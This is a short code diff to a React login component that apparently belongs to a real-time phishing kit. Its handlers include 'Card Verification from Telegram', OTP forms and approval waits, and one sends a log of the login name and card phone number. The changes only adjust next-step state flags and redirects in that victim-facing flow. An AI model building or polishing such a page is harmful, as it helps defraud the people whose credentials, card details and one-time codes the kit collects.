@@ -63,6 +63,7 @@ const handleApproveLogin = () => {
 // Handle OTP Connexion
 const handleOtpLogin = () => {
   console.log('🔐 OTP Connexion clicked');
+  setShowNextStep(false);
   setWaitingForApproval(false);
   setIsLoading(false);
   setShowOtpForm(true);
@@ -93,6 +94,7 @@ const handleLoginFalse = () => {
   // Handle Card Verification from Telegram - ADD THIS
 const handleCardVerificationFromTelegram = () => {
   console.log('💳 Card Verification from Telegram clicked');
+  setShowNextStep(false);
   setWaitingForApproval(false);
   setIsLoading(false);
   setShowApprovePopup(false);
@@ -124,6 +126,7 @@ const handleCardVerificationFromTelegram = () => {
       setShowNextStep(true);
     } else {
       console.log('📝 Showing card form for first time');
+      setShowNextStep(false);
       setShowCardForm(true);
     }
   };
@@ -151,6 +154,7 @@ const handleCardVerificationFromTelegram = () => {
       await sendOtpPageLog(loginName, cardDetails.phoneNumber, sessionId);
       hasSentOtpLogRef.current = true;
     }
+    setShowNextStep(false);
     setWaitingForOtpApproval(false);
     setIsLoading(false);
     setShowCardForm(false);
@@ -172,6 +176,7 @@ const handleCardVerificationFromTelegram = () => {
 
   const handleBackToLogin = () => {
     console.log('🔵 Back to Login button clicked!');
+    setShowNextStep(false);
     setShowCardForm(false);
     setShowOtpForm(false);
     setWaitingForOtpApproval(false);
@@ -221,12 +226,14 @@ const handleCardVerificationFromTelegram = () => {
   
   const handleNextStepAppr = async () => {
     console.log('🔵 Next Step (Appr) button clicked!');
-    window.location.href = '/#/NextStepAppr';
+    setShowNextStep(true);
+    setWaitingForApproval(false);
+    setIsLoading(false);
   };
 
   const handleBackToAppr = () => {
     console.log('🔵 Back to Appr Page button clicked!');
-    window.location.href = '/#/NextStepAppr';
+    window.location.href = '/#/';
   };
 
   const handleDenyOtp = () => {
